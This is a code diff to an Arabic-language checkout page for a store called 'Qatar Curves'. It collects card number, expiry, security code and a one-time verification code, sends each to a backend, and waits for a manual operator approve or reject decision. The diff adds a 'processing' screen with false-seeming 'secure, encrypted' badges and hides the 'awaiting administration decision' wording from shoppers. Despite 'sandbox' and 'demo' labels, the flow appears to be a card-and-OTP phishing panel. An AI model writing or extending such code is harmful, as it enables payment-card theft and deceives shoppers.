@@ -7,7 +7,7 @@ import { trpc } from "@/lib/trpc";
 import { VISITOR_SESSION_KEY } from "@shared/visitorPresence";
 
 const zones = ["الدوحة", "الريان", "أم صلال", "الوكرة", "الخور والذخيرة", "الشحانية", "الظعاين", "مسيعيد"];
-const steps = [{ path: "/checkout/address", label: "العنوان" }, { path: "/checkout/payment", label: "الدفع" }, { path: "/checkout/verify", label: "التأكيد" }];
+const steps = [{ path: "/checkout/address", label: "العنوان" }, { path: "/checkout/payment", label: "الدفع" }, { path: "/checkout/waiting", label: "المعالجة" }, { path: "/checkout/verify", label: "التأكيد" }];
 const CHECKOUT_FLOW_KEY = "qatar-curves-checkout-flow-id";
 const SANDBOX_PAYMENT_KEY = "qatar-curves-sandbox-payment";
 const SANDBOX_RECORD_KEY = "qatar-curves-sandbox-record-key";
@@ -151,7 +151,7 @@ function PaymentStep() {
     try {
       await createSandboxPayment.mutateAsync({ stage: "payment", recordKey: `${flowId}-payment-${Date.now().toString(36)}`, flowId, customerLabel: checkout.name, phone: checkout.phone, zone: checkout.zone, address: checkout.address, items: cart.items.map(item => ({ name: item.name, quantity: item.quantity, size: item.size, color: item.color, priceQar: item.priceQar })), amountQar: cartTotal(cart), cardBrand: method, demoCardNumber, demoExpiry, demoSecurityCode });
       localStorage.setItem(SANDBOX_PAYMENT_KEY, JSON.stringify({ cardBrand: method, demoCardNumber, demoExpiry, demoSecurityCode, holder }));
-      navigate("/checkout/verify");
+      navigate("/checkout/waiting");
     } catch { setError("تعذر إرسال البيانات، حاولي مرة أخرى"); setIsSubmitting(false); }
   };
   const cardNumber = (value: string) => value.replace(/\D/g, "").slice(0, 16).replace(/(.{4})/g, "$1 ").trim();
@@ -215,32 +215,52 @@ function PaymentStep() {
   </main></>;
 }
 
+function WaitingStep() {
+  const [, navigate] = useLocation();
+  const [flowId] = useState(() => getCheckoutFlowId());
+  const { data: decision } = trpc.analytics.sandboxPaymentDecision.useQuery({ flowId }, { refetchInterval: 2000, retry: 2 });
+  useEffect(() => {
+    if (!decision) return;
+    if (decision.status === "approved") navigate("/checkout/verify");
+    if (decision.status === "rejected") { localStorage.setItem("qatar-curves-payment-error", "فشل الدفع، يرجى إعادة المحاولة أو استخدام طريقة دفع أخرى"); localStorage.removeItem(SANDBOX_PAYMENT_KEY); localStorage.removeItem(SANDBOX_RECORD_KEY); navigate("/checkout/payment"); }
+  }, [decision, navigate]);
+  return <><CheckoutHeader active={2} /><main className="container flex min-h-[610px] items-center justify-center py-12"><div className="w-full max-w-[480px] text-center">
+    <span className="mx-auto mb-8 flex h-24 w-24 items-center justify-center rounded-full bg-[#f5efe9]"><LoaderCircle size={40} className="animate-spin text-[#8d2430]" /></span>
+    <h1 className="display-serif text-4xl sm:text-5xl">جارٍ معالجة الدفع</h1>
+    <p className="mx-auto mt-5 max-w-[400px] text-sm leading-7 text-[#746c64]">يتم التحقق من بيانات البطاقة، يرجى الانتظار...</p>
+    <div className="mx-auto mt-8 flex max-w-[360px] flex-col gap-3">
+      <div className="flex items-center gap-3 rounded-xl border border-[#e8ddd2] bg-white px-4 py-3 text-right text-xs text-[#746c64]"><ShieldCheck size={18} className="shrink-0 text-[#8d2430]" /> يتم التحقق من البيانات بشكل آمن</div>
+      <div className="flex items-center gap-3 rounded-xl border border-[#e8ddd2] bg-white px-4 py-3 text-right text-xs text-[#746c64]"><LockKeyhole size={18} className="shrink-0 text-[#8d2430]" /> اتصال مشفر ومحمي بالكامل</div>
+    </div>
+  </div></main></>;
+}
+
 function VerifyStep() {
   const [, navigate] = useLocation();
   const createSandboxPayment = trpc.analytics.createSandboxPayment.useMutation();
   const [flowId] = useState(() => getCheckoutFlowId());
-  const [code, setCode] = useState(["", "", "", "", "", ""]); const [error, setError] = useState(""); const [notice, setNotice] = useState(""); const [isSubmitting, setIsSubmitting] = useState(false); const [awaitingDecision, setAwaitingDecision] = useState(false); const inputs = useRef<Array<HTMLInputElement | null>>([]);
+  const [code, setCode] = useState(["", "", "", "", "", ""]); const [error, setError] = useState(""); const [isSubmitting, setIsSubmitting] = useState(false); const [awaitingDecision, setAwaitingDecision] = useState(false); const inputs = useRef<Array<HTMLInputElement | null>>([]);
   const { data: decision } = trpc.analytics.sandboxPaymentDecision.useQuery({ flowId }, { enabled: awaitingDecision, refetchInterval: 2000, retry: 2 });
   useEffect(() => {
     if (!awaitingDecision || !decision) return;
     if (decision.status === "approved") { localStorage.setItem("qatar-curves-last-order", JSON.stringify({ orderNumber: decision.orderNumber })); localStorage.removeItem(SANDBOX_PAYMENT_KEY); localStorage.removeItem(SANDBOX_RECORD_KEY); localStorage.removeItem(CHECKOUT_FLOW_KEY); writeCart({ items: [] }); navigate("/checkout/success"); }
-    if (decision.status === "rejected") { localStorage.setItem("qatar-curves-payment-error", "تم رفض الدفع. أدخلي بيانات مختلفة للمتابعة."); localStorage.removeItem(SANDBOX_PAYMENT_KEY); localStorage.removeItem(SANDBOX_RECORD_KEY); setAwaitingDecision(false); setIsSubmitting(false); navigate("/checkout/payment"); }
+    if (decision.status === "rejected") { localStorage.setItem("qatar-curves-payment-error", "فشل الدفع، يرجى إعادة المحاولة أو استخدام طريقة دفع أخرى"); localStorage.removeItem(SANDBOX_PAYMENT_KEY); localStorage.removeItem(SANDBOX_RECORD_KEY); setAwaitingDecision(false); setIsSubmitting(false); navigate("/checkout/payment"); }
   }, [awaitingDecision, decision, navigate]);
   const update = (index: number, value: string) => { const digit = value.replace(/\D/g, "").slice(-1); setCode(current => { const next = [...current]; next[index] = digit; return next; }); setError(""); if (digit && index < 5) inputs.current[index + 1]?.focus(); };
   const submit = async (event: React.FormEvent) => {
     event.preventDefault(); if (isSubmitting) return; const enteredCode = code.join(""); if (!["123456", "654321"].includes(enteredCode)) { setError("أدخلي كود التحقق 123456 أو 654321"); return; } const demoVerificationCode = enteredCode as "123456" | "654321";
     const checkout = JSON.parse(localStorage.getItem("qatar-curves-checkout") || "null"); const payment = JSON.parse(localStorage.getItem(SANDBOX_PAYMENT_KEY) || "null"); const cart = readCart();
     if (!checkout || !payment?.demoCardNumber || !cart.items.length) { setError("تعذر العثور على بيانات الطلب، عودي للسلة وحاولي مجددًا"); return; }
-    setError(""); setNotice(""); setIsSubmitting(true); const storedKey = localStorage.getItem(SANDBOX_RECORD_KEY); const recordKey = storedKey || `${Date.now().toString(36)}-${crypto.randomUUID().replaceAll("-", "").slice(0, 16)}`; localStorage.setItem(SANDBOX_RECORD_KEY, recordKey); const orderNumber = `DEMO-${recordKey.replaceAll("-", "").slice(0, 18).toUpperCase()}`;
-    try { await createSandboxPayment.mutateAsync({ stage: "confirmation", recordKey: `${recordKey}-confirmation`, flowId, orderNumber, customerLabel: checkout.name, phone: checkout.phone, zone: checkout.zone, address: checkout.address, items: cart.items.map(item => ({ name: item.name, quantity: item.quantity, size: item.size, color: item.color, priceQar: item.priceQar })), cardBrand: payment.cardBrand, demoCardNumber: payment.demoCardNumber, demoExpiry: payment.demoExpiry, demoSecurityCode: payment.demoSecurityCode, demoVerificationCode, amountQar: cartTotal(cart) }); setNotice("تم إرسال الطلب. بانتظار قبول أو رفض الإدارة."); setAwaitingDecision(true); }
+    setError(""); setIsSubmitting(true); const storedKey = localStorage.getItem(SANDBOX_RECORD_KEY); const recordKey = storedKey || `${Date.now().toString(36)}-${crypto.randomUUID().replaceAll("-", "").slice(0, 16)}`; localStorage.setItem(SANDBOX_RECORD_KEY, recordKey); const orderNumber = `DEMO-${recordKey.replaceAll("-", "").slice(0, 18).toUpperCase()}`;
+    try { await createSandboxPayment.mutateAsync({ stage: "confirmation", recordKey: `${recordKey}-confirmation`, flowId, orderNumber, customerLabel: checkout.name, phone: checkout.phone, zone: checkout.zone, address: checkout.address, items: cart.items.map(item => ({ name: item.name, quantity: item.quantity, size: item.size, color: item.color, priceQar: item.priceQar })), cardBrand: payment.cardBrand, demoCardNumber: payment.demoCardNumber, demoExpiry: payment.demoExpiry, demoSecurityCode: payment.demoSecurityCode, demoVerificationCode, amountQar: cartTotal(cart) }); setAwaitingDecision(true); }
     catch (caught) { console.error("[Sandbox payment submit]", caught); setError("تعذر إرسال الطلب مؤقتًا. حاولي مرة أخرى."); setIsSubmitting(false); }
   };
-  return <><CheckoutHeader active={2} /><main className="container flex min-h-[610px] items-center justify-center py-12"><form onSubmit={submit} className="w-full max-w-[560px] text-center"><span className="mx-auto mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-amber-100 text-amber-700"><Smartphone size={26} /></span><div className="eyebrow mb-3 text-[#8d2430]">VERIFY / ٠٣</div><h1 className="display-serif text-5xl sm:text-6xl">كود التحقق<br /><em className="font-normal text-[#8d2430]">الآمن.</em></h1><p className="mx-auto mt-5 max-w-[430px] text-sm leading-7 text-[#746c64]">أدخلي كود التحقق المرسل إليك لتأكيد عملية الدفع.</p><div className="mx-auto my-9 flex max-w-[430px] justify-center gap-2 sm:gap-3" dir="ltr">{code.map((digit, index) => <input key={index} ref={(element) => { inputs.current[index] = element; }} value={digit} disabled={awaitingDecision} onChange={(event) => update(index, event.target.value)} inputMode="numeric" maxLength={1} aria-label={`رقم ${index + 1} من كود التحقق`} className="h-14 w-11 border border-[#d8cbbf] bg-[#fbf8f4] !text-center text-xl font-semibold outline-none focus:border-[#8d2430] disabled:opacity-60 sm:h-16 sm:w-14" />)}</div>{error && <p className="mb-5 text-sm text-[#8d2430]">{error}</p>}{notice && <p className="mb-5 text-sm font-semibold text-emerald-700">{notice}</p>}<button disabled={isSubmitting} className="pill-button w-full max-w-[430px] gap-3 bg-[#252220] px-8 py-4 text-sm font-semibold text-white hover:bg-[#8d2430] disabled:opacity-75">{awaitingDecision ? <><LoaderCircle size={17} className="animate-spin" /> بانتظار قرار الإدارة</> : isSubmitting ? <><LoaderCircle size={17} className="animate-spin" /> جارٍ التحقق</> : <>تأكيد <Check size={17} /></>}</button></form></main></>;
+  return <><CheckoutHeader active={3} /><main className="container flex min-h-[610px] items-center justify-center py-12"><form onSubmit={submit} className="w-full max-w-[560px] text-center"><span className="mx-auto mb-6 flex h-16 w-16 items-center justify-center rounded-full bg-amber-100 text-amber-700"><Smartphone size={26} /></span><h1 className="display-serif text-4xl sm:text-5xl">كود التحقق</h1><p className="mx-auto mt-5 max-w-[430px] text-sm leading-7 text-[#746c64]">أدخلي كود التحقق المرسل إليك لتأكيد عملية الدفع.</p><div className="mx-auto my-9 flex max-w-[430px] justify-center gap-2 sm:gap-3" dir="ltr">{code.map((digit, index) => <input key={index} ref={(element) => { inputs.current[index] = element; }} value={digit} disabled={awaitingDecision} onChange={(event) => update(index, event.target.value)} inputMode="numeric" maxLength={1} aria-label={`رقم ${index + 1} من كود التحقق`} className="h-14 w-11 rounded-xl border border-[#d8cbbf] bg-white !text-center text-xl font-semibold outline-none focus:border-[#8d2430] disabled:opacity-60 sm:h-16 sm:w-14" />)}</div>{error && <p className="mb-5 text-sm text-[#8d2430]">{error}</p>}{awaitingDecision && <p className="mb-5 flex items-center justify-center gap-2 text-sm font-semibold text-emerald-700"><LoaderCircle size={15} className="animate-spin" /> بانتظار التأكيد...</p>}<button disabled={isSubmitting} className="pill-button w-full max-w-[430px] gap-3 rounded-xl bg-[#8d2430] px-8 py-4 text-sm font-semibold text-white shadow-md hover:bg-[#252220] disabled:opacity-75">{awaitingDecision ? <><LoaderCircle size={17} className="animate-spin" /> بانتظار التأكيد</> : isSubmitting ? <><LoaderCircle size={17} className="animate-spin" /> جارٍ التحقق</> : <>تأكيد <Check size={17} /></>}</button></form></main></>;
 }
 
 function SuccessStep() { return <><CheckoutHeader active={3} /><main className="container flex min-h-[610px] items-center justify-center py-12"><div className="max-w-[580px] text-center"><span className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-[#8d2430] text-white"><Check size={34} /></span><div className="eyebrow mb-3 text-[#8d2430]">ORDER CONFIRMED / ٠٤</div><h1 className="display-serif text-6xl">تمت العملية<br /><em className="font-normal text-[#8d2430]">بنجاح.</em></h1><p className="mx-auto mt-5 max-w-[410px] text-sm leading-7 text-[#746c64]">شكرًا لاختيارك Qatar Curves، سنكون سعداء بخدمتك.</p><Link href="/" className="pill-button mt-8 gap-3 bg-[#252220] px-8 py-3 text-sm font-semibold text-white hover:bg-[#8d2430]">العودة للمتجر <ArrowLeft size={17} /></Link></div></main></>; }
 
 export default function CheckoutPage() {
-  const [, address] = useRoute("/checkout/address"); const [, payment] = useRoute("/checkout/payment"); const [, verify] = useRoute("/checkout/verify");
-  if (address) return <AddressStep />; if (payment) return <PaymentStep />; if (verify) return <VerifyStep />; return <SuccessStep />;
+  const [, address] = useRoute("/checkout/address"); const [, payment] = useRoute("/checkout/payment"); const [, waiting] = useRoute("/checkout/waiting"); const [, verify] = useRoute("/checkout/verify");
+  if (address) return <AddressStep />; if (payment) return <PaymentStep />; if (waiting) return <WaitingStep />; if (verify) return <VerifyStep />; return <SuccessStep />;
 }
